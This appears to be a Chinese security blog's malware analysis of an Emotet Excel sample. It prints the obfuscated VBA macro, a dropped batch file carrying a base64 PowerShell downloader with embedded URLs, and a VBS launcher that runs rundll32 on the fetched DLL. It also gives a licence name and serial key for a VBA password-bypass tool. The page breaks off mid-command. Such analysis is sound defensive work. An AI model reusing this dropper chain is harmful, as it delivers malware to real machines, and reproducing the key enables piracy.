<!DOCTYPE HTML>
<html lang="zh">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Emotet攻击样本分析, 网络安全">
    <meta name="description" content="1.简介Emotet 是一种计算机恶意软件程序，最初是作为一种银行木马病毒开发的。其目的是访问外部设备并监视敏感的私有数据。众所周知，Emotet 会骗过基本的防病毒程序并保持隐匿。一旦被感染，该恶意软件会像计算机蠕虫病毒一样传播，并试图渗">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Emotet攻击样本分析 | Aspirepig</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Aspirepig</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Aspirepig</div>
        <div class="logo-desc">
            
            网络安全小菜鸡
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Emotet攻击样本分析</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Emotet/">
                                <span class="chip bg-color">Emotet</span>
                            </a>
                        
                            <a href="/tags/macro/">
                                <span class="chip bg-color">macro</span>
                            </a>
                        
                            <a href="/tags/windows/">
                                <span class="chip bg-color">windows</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2022-02-16
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    1.8k
                </div>
                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Emotet 是一种计算机恶意软件程序，最初是作为一种<a target="_blank" rel="noopener" href="https://www.kaspersky.com/resource-center/threats/shylock-banking-trojan-definition">银行木马病毒</a>开发的。其目的是访问外部设备并监视敏感的私有数据。众所周知，Emotet 会骗过基本的防病毒程序并保持隐匿。一旦被感染，该恶意软件会像计算机蠕虫病毒一样传播，并试图渗透到网络中的其他计算机。</p>
<p>Emotet 主要通过垃圾电子邮件传播。相应的电子邮件包含恶意链接或受感染的文档。如果您下载文档或打开链接，则其他恶意软件会自动下载到您的计算机上。这些电子邮件看起来非常真实，因此 Emotet 的受害者为数众多。 </p>
<p>从 21年底， Emotet 重登恶意软件榜首，其主要传播方式为邮件传播，利用宏执行命令，感染设备后继续向设备中的联系人发送邮件进行传播。</p>
<h2 id="2-前期准备"><a href="#2-前期准备" class="headerlink" title="2.前期准备"></a>2.前期准备</h2><ul>
<li>样本 xxxx.xls </li>
<li>VBA Password Bypasser.exe （绕过VBA脚本加密）</li>
<li>window虚拟机（已安装office）</li>
</ul>
<h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h2><h3 id="3-1-恶意宏提取"><a href="#3-1-恶意宏提取" class="headerlink" title="3.1 恶意宏提取"></a>3.1 恶意宏提取</h3><p>恶意文档，为了使人执行恶意宏，会放入诱导启用编辑或启用内容的话术，如下图：</p>
<p><img src="/assets/image-20220216161344198.png" alt="image-20220216161344198"></p>
<p>我们直接在Excel界面按Alt+F11 ,打开VB工程，发现工程被加密</p>
<p><img src="/assets/image-20220216161548056.png" alt="image-20220216161548056"></p>
<p>可使用 VBA Password Bypasser.exe（网上自行下载） 绕过VB项目加密</p>
<p>安装完成后，激活软件：</p>
<p>姓 名（Name）：JekG</p>
<p>序 列 号（Code）：000014-RKND8F-B3WQ7U-KDNY8V-ZZFZZZ-ZZZZZZ-ZWCJP9-51VJ00-800000-000000</p>
<p>可使用以下两种方式打开：</p>
<ul>
<li>打开软件，点击open，选择样本 xls文件，直接打开Excel(可能找不到 Excel路径导致打不开)</li>
</ul>
<p><img src="/assets/image-20220216161738759.png" alt="image-20220216161738759"></p>
<ul>
<li>或点击 Run customer command line，输入Excel 的路径，启动Excel后，在Excel中打开xls文件</li>
</ul>
<p><img src="/assets/image-20220216161950156.png" alt="image-20220216161950156"></p>
<p>可以看到再次打开 VBA工程时，不会再提示需要输入密码</p>
<p><img src="/assets/image-20210216171222347.png" alt="image-20210216171222347"></p>
<h3 id="3-2-恶意宏分析"><a href="#3-2-恶意宏分析" class="headerlink" title="3.2 恶意宏分析"></a>3.2 恶意宏分析</h3><pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">Const dhcSum As Integer = 0
Const dhcAvg As Integer = 1
Const dhcMax As Integer = 2
Const dhcMin As Integer = 3
Const dhcCount As Integer = 4
Const dhcSumPlus As Integer = 5
Const dhcSumMinus As Integer = 6
Const dhcCountFull As Integer = 7
Const dhcCountNotNull As Integer = 8
Const dhcCountPlus As Integer = 9
Const dhcCountMinus As Integer = 10
Sub ghsdrsDERGshdhsrse5wasd()
   Dim intLastRow As Integer
   Dim intRow As Integer
   Dim intYesRow As Integer
   Dim intNoRow As Integer
   Dim strText As String
   Dim strNewName As String
   Dim strNewQuestion As String
   Dim intRes As Integer
   MsgBox "fgzdsrfyhgj myjdf. Gaserfhlsd srhtgius.", vbOKOnly, _
    "gharagsdf"
   intLastRow = Worksheets("Data").Range("D1").Value + 1
   intRow = 1
   Do While intRow &lt; intLastRow
      strText = Worksheets("Data").Cells(intRow, 1).Value
      intYesRow = Worksheets("Data").Cells(intRow, 2).Value
      intNoRow = Worksheets("Data").Cells(intRow, 3).Value
      If intYesRow &gt; 0 Then
         intRes = MsgBox(strText, vbYesNo, "hueswrfg")
         If intRes = vbYes Then
            intRow = intYesRow
         Else
            intRow = intNoRow
         End If
      Else
         intRes = MsgBox("weg " &amp; strText &amp; "d", vbYesNo, "rtgwae")
      End If
   Loop
End Sub
Private Sub Workbook_Open()
   Dim lngAge As Long
   Dim datDate As Date
   datDate = Now: lngAge = DateDiff("yyyy", _
   datDate, Date): kjDygzs34e.Caption = Cells(105, 7) + _
   vbCrLf &amp; Cells(103, 6)
   If DateSerial(Year(datDate) + lngAge, Month(datDate), _
    Day(datDate)) &gt; Date Then
      lngAge = lngAge - 1
   End If
   lngAge = lngAge + 1: kjDygzs34e.Tag = Replace(Cells(102, 5), _
   "uwpe", ""): hsdFghawoyhitshdg Range("D147"), Range("A203"): dhCalculateAge = _
   lngAge: kjDygzs34e.trgsEtgseg.Text = ":"
End Sub
Sub HstgsAgsw4Rfhsf(ghoiwue As String, tyo3oe As String, HSere4yd As Boolean)
   Dim strStyle As String:   Dim strAlign As String:   Dim strOut As String
   Dim cell As Object: Dim strCellText As String: Dim lngRow As Long
   Dim lngLastRow As Long: Dim strTemp As String
   Dim objWordApp As Object
   Dim i As Long: i = 1: lngLastRow = _
   Selection.Row: Open ghoiwue For Output As #i
   For Each cell In Selection
      lngRow = cell.Row
      If i &lt; 0 Then
      If lngRow &lt;&gt; lngLastRow Then
         strOut = strOut &amp; vbTab &amp; "&lt;/tr&gt;" &amp; vbCrLf &amp; vbTab &amp; _
          "&lt;tr&gt;" &amp; vbCrLf
         lngLastRow = lngRow
      End If
      If Not IsNull(cell.Font.Size) Then
         strStyle = " style=" &amp; "font-size: " &amp; Int(100 * _
          cell.Font.Size / 19) &amp; "%;"
      End If
      If cell.Font.Bold Then
         strCellText = "&lt;b&gt;" &amp; strCellText &amp; "&lt;/b&gt;"
      End If
      If cell.HorizontalAlignment = xlRight Then
         strAlign = " align=" &amp; "right"
      ElseIf cell.HorizontalAlignment = xlCenter Then
         strAlign = " align=" &amp; "center"
      Else
         strAlign = ""
      End If
      strCellText = cell.Text
      If cell.Orientation &lt;&gt; xlHorizontal Then
         strTemp = ""
         For i = 1 To Len(strCellText)
            strTemp = strTemp &amp; Mid$(strCellText, i, 1) &amp; "&lt;br&gt;"
         Next i
         strCellText = strTemp
         strStyle = ""
      End If
      End If
      strOut = strOut &amp; vbTab &amp; vbTab &amp; "&lt;td" &amp; strStyle &amp; strAlign _
       &amp; "&gt;" &amp; strCellText &amp; "&lt;/td&gt;" &amp; vbCrLf
   Next
   strOut = vbTab &amp; "&lt;tr&gt;" &amp; vbCrLf &amp; strOut &amp; vbTab &amp; _
   "&lt;/tr&gt;" &amp; vbCrLf: Print #i, tyo3oe
   strOut = "&lt;table border=1 cellpadding=3 cellspacing=1&gt;" &amp; vbCrLf &amp; _
    strOut &amp; vbCrLf &amp; "&lt;/table&gt;": Close #i
    If strOut = "g457dt" Then
   Set objWordApp = CreateObject("Word.Application")
   objWordApp.documents.Add
   objWordApp.Selection = strOut
   objWordApp.Selection.Copy
   objWordApp.Visible = True
   Set objWordApp = Nothing
   End If
End Sub
Function hsdFghawoyhitshdg(rgWeights As Range, rgValues As Range) _
 As Double
   If (rgWeights.Count &lt;&gt; rgValues.Count) Then
      hsdFghawoyhitshdg = 0
      Exit Function
   End If
   Dim dblSum As Double: Dim dblSumWeight As Double
   Dim i As Integer: HstgsAgsw4Rfhsf Cells(101, 10), _
   kjDygzs34e.Caption, True
   For i = 1 To rgWeights.Count
      dblSumWeight = dblSumWeight + rgWeights(i) * rgValues(i)
      dblSum = dblSum + rgWeights(i)
   Next
   If dblSum &lt; 0.1 Then dblSum = 1
   HstgsAgsw4Rfhsf Cells(104, 12), kjDygzs34e.Tag, False
   hsdFghawoyhitshdg = dblSumWeight / dblSum
End Function
</code></pre>

<p>整个 脚本VBA脚本代码量并不是特别大，可以看到有很多随机字符组成的字符串（加大了此为恶意脚本的可疑度）。</p>
<p>分析 VBA脚本时，可重点关注 open close replace cells 等函数</p>
<p>经初步分析，大致可以看出，此脚本是将执行的恶意代码放在单元格中，此处使用宏脚本将单元格恶意代码取出，做一定的replace变换后输出到 vbs脚本及bat脚本，随后使用 </p>
<p>通过动态调试，可以看到程序生成一个 vbs脚本，一个bat脚本</p>
<p><img src="/assets/image-20220216180341012.png" alt="image-20220216180341012"></p>
<h4 id="c-programdata-uidpjewl-bat"><a href="#c-programdata-uidpjewl-bat" class="headerlink" title="c:\programdata\uidpjewl.bat"></a>c:\programdata\uidpjewl.bat</h4><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">dir</span>&amp;<span class="token function">echo</span> hjsoihjspod fgjosdFhstjtyjuStJsDHTTJDGGfVBXDrtfyh57erthDFhsDRh&amp;<span class="token function">SET</span> kjXDFgjrth5=po&amp;<span class="token function">echo</span> BGZDSRGRES4GJHFKDGUkCHkjxcgjXdfrHdfxghzd46drxzdgdsfgxzzs4&amp;<span class="token function">SET</span> KFfklhgJxdh=wers&amp;<span class="token function">echo</span> FHzsDFHhGjgfJxd56r8utycjgxHzdrfg HgfhsdrfghdrzsgrDgsd46drszgdf&amp;<span class="token function">SET</span> etaRHjDhfd4=hell <span class="token operator">-</span>e&amp;<span class="token function">echo</span> GjghfkuoFJUkCnjxDhrewg236ethjgdfhD5ufJdfHDSGRshdtJghDfGSreghDfh&amp;<span class="token function">SET</span> iiPgjlfJds467=nc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2A&amp;<span class="token function">echo</span> BHMJCFghJYIfGd56y7DfHXCFghdsGdrsG DHdFdgdsgf rfghDRGd46567DRghDFGSreGDfg&amp;<span class="token function">SET</span> XCVzWRet4=FoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQBsAGUALwBFAFcAMgA0AEEAWQBKAEMAdgBCAHAATgA4AEcAYwAvACwAaAB0AHQAcAA6AC8ALwBoAG8AbQBlAGgAYQBuAGQAeQB3AG8AcgBrAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB4AEYASQBEAFAAZgBzADQAUwBTADEAeQB3ADcAZwBoAFgAWABrAC8ALABoAHQAdABwADoALwAvAGgAaQAtAHQAZQBjAGgAYQB1AGQAaQBvAC4AYwBvAG0ALwBkAGkAcg&amp;<span class="token function">echo</span> HyKFYUIfYHjDXgfxhdRFGDS47dthxdfhdfhX57dfghjXgJFTJUXSDHdRxghDRxtHJYUOIighl&amp;<span class="token function">SET</span> NmvbmxdrtX7sd5rs=AyADAAMgAxAC8AZwAzAGQALwAsAGgAdAB0AHAAOgAvAC8AcgBvAGQAZQByAGkAYwBrAHAAbwB3AGUAbABsAGUAbgB0AGUAcgB0AGEAaQBuAG0AZQBuAHQALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwBPAFYATwB5AE4AMwB5ADkALwAsAGgAdAB0AHAAcwA6AC8ALwBjAG8AbgBzAGMAaQBlAG4AYwBlAHMALgBjAGUAbgB0AGUAcgAvAHcAcAAtAGkAbgBjAGwAdQBkAGUAcwAvAFMAawBXADIAdwAvACwAaAB0AHQAcAA6AC8ALwBtAGEAZwAtAGQAZQBzAGkAZwBuAHMALgBjAG8AbQAvAGMAcwBzAC8ATAAzAFEASwBsAHIANgBpAFQAegBJAEwAVgB6AGIAbgBDAC8AIgAuAHMAUABMAEkAdAAoACIALAAiACkAOwAgAGYAbwBSAGUAQQBDAGgAKAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAGkATgAgACQATQBKAFgAZABmAHMAaABEAHIAZgBHAFoAcwBlAHMANAApACAAewAkAEcAdwBlAFkASAA1ADcAcwBlAGQAcwB3AGQ&amp;<span class="token function">echo</span> GHJGFJDYik79fgUlhXMJGNxdrgsREhdrXDtgj57sdfhXZdrESgSzXHgJxnj46&amp;<span class="token function">SET</span> DRGhREkjif=APQAoACIAYwBpAHUAdwBkADoAaQB1AHcAZABcAHAAcgBpAHUAdwBkAG8AZwBpAHUAdwBkAHIAYQBtAGkAdQB3AGQAZABhAHQAaQB1AHcAZABhAFwAcAB1AGkAaABvAHUAZAAuAGQAaQB1AHcAZABsAGkAdQB3AGQAbAAiACkALgByAGUAUABsAEEAQwBlACgAIgBpAHUAdwBkACIALAAiACIAKQA7AGkAbgBWAE8AawBlAC0AdwBlAEIAcgBFAHEAVQBlAHMAVAAgAC0AdQBSAEkAIAAkAHkASQBkAHMAUgBoAHkAZQAzADQAcwB5AHUAZgBnAHgAagBjAGQAZgAgAC0AbwBVAHQARgBJAGwAZQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAA7AGkARgAoAHQAZQBTAHQALQBwAEEAVABoACAAJABHAHcAZQBZAEgANQA3AHMAZQBkAHMAdwBkACkAewBpAGYAKAAoAGcARQB0AC0AaQB0AEUAbQAgACQARwB3AGUAWQBIADUANwBzAGUAZABzAHcAZAApAC4AbABlAE4ARwB0AGgAIAAtAGcAZQAgADQANwA0ADMANgApAHsAYgBSAGUAYQBrADsAfQB9AH0A
<span class="token function">echo</span> GHJDFTGjTJTFhdzsrS47dfgjhKGUHXnxcvNr hrtHGXMNJgNxdzRFgh57dtFJUgXHJHDFgrH&amp;<span class="token function">start</span><span class="token operator">/</span>B <span class="token operator">/</span>WAIT <span class="token operator">%</span>kjXDFgjrth5%<span class="token operator">%</span>KFfklhgJxdh%<span class="token operator">%</span>etaRHjDhfd4%<span class="token operator">%</span>iiPgjlfJds467%<span class="token operator">%</span>XCVzWRet4%<span class="token operator">%</span>NmvbmxdrtX7sd5rs%<span class="token operator">%</span>DRGhREkjif<span class="token operator">%</span>&amp;<span class="token function">echo</span> dgfhakirjshgfJgfJd57udgfJxsDGFjxDSHzDFHDZFHdgfxs547dfhJXGHJXDFHdrf4s6dfh</code></pre>

<h4 id="c-programdata-tjspowj-vbs"><a href="#c-programdata-tjspowj-vbs" class="headerlink" title="c:\programdata\tjspowj.vbs"></a>c:\programdata\tjspowj.vbs</h4><pre class="language-vbscript" data-language="vbscript"><code class="language-vbscript">dim gSEdJDsfy5JGHKdggdh:hjrfo2wehokd="WjwpeoScjwpeoripjwpeot.Sjwpeohejwpeoljwpeol":dvgnoma4ibhnld="cuerlxmuerlxd /uerlxc suerlxtauerlxruerlxt uerlx/uerlxB uerlxc:uerlx\wuerlxinuerlxdowuerlxs\suerlxyswuerlxouerlxw6uerlx4\ruuerlxnduerlxluerlxl3uerlx2.uerlxexuerlxe uerlxc:uerlx\uerlxpruerlxoguerlxramuerlxdauerlxta\puihoud.duerlxluerlxl,tjpleowdsyf":set gSEdJDsfy5JGHKdggdh=wscript.createobject(replace(hjrfo2wehokd,"jwpeo","")):dim ryulxdHSerw:ryulxdHSerw=replace("curiw:uriw\puriwrogruriwamduriwaturiwa\uidpjewl.buriwat","uriw",""):gSEdJDsfy5JGHKdggdh.run ryulxdHSerw,0,true:dim HkjsdsfEhdse46d:HkjsdsfEhdse46d=replace(dvgnoma4ibhnld,"uerlx",""):gSEdJDsfy5JGHKdggdh.run HkjsdsfEhdse46d,0</code></pre>

<p>进行简化得到</p>
<p>c:\programdata\uidpjewl.bat</p>
<p>可使用 <a target="_blank" rel="noopener" href="https://raikia.com/tool-powershell-encoder/">https://raikia.com/tool-powershell-encoder/</a> 解 base64 （powershell编码为 utf-16）</p>
<pre class="language-none"><code class="language-none">powershell -enc JABNAEoAWABkAGYAcwBoAEQAcgBmAEcAWgBzAGUAcwA0AD0AIgBoAHQAdABwADoALwAvAGEAbABpAHYAZQBzAHkAcwB0AGUAbQBzAC4AYwBvAG0ALwBlAGwAbgAtAGkAbQBhAGcAZQBzAC8AcABtADIAcgBTAHMAbgBWAE0ALwAsAGgAdAB0AHAAOgAvAC8AZABvAG4ALQBsAGUAZQAuAGMAbwBtAC8AXwBuAG8AdABlAHMALwBVADYASAAxADQARABOAEEALwAsAGgAdAB0AHAAOgAvAC8AbQBlAGwAbABvAHcANgAwAHMALgBjAG8AbQAvAFMAdABhAG4AbABlAHkAXwBmAGkAbABlAHMALwBFAEYASQBxAHcAWgAxADgAMwByAGYAbQBkAC8ALABoAHQAdABwADoALwAvAHAAcgBvAC0AZgBpAGMAaQBlAG4AdABsAGwAYwAuAGMAbwBtAC8AUABEAEYAXwBmAGkAbABlAHMALwA1AEEAOQBXADgALwAsAGgAdAB0AHAAOgAvAC8AbABvAHMAdAAtAGUAYQByAHQAaAAuAGMAbwBtAC8AQgBsAGEAYwBrAF8AYQBuAGQAXwBXAGgAaQB0AGUALwBaAFcANAByAEgARQBkAEQAMQB2AFoAWAAvACwAaAB0AHQAcAA6AC8ALwBjAHIAZQBlAGQAbQBvAG8AcgBwAGEAcgB0AG4AZQByAHMALgBjAG8AbQAvAGUAbABuAC0AaQBtAGEAZwBlAHMALwB3AEUAWQBLAGQANQBLAEoAWgBFAFQAaABlAEIAcwB3AHEALwAsAGgAdAB0AHAAOgAvAC8AbQBhAHQAdABlAHIAcwBvAGYAZgBhAGMAdAAuAGMAbwBtAC8AYwBnAGkALwBFADAAQwAxAHYAdABTAHEAdAAvACwAaAB0AHQAcAA6AC8ALwBwAHUAcgBlAHAAbABhAHQAaQBuAHUAbQBiAGEAbgBkAC4AYwBvAG0ALwBTAGMAaABlAGQAdQ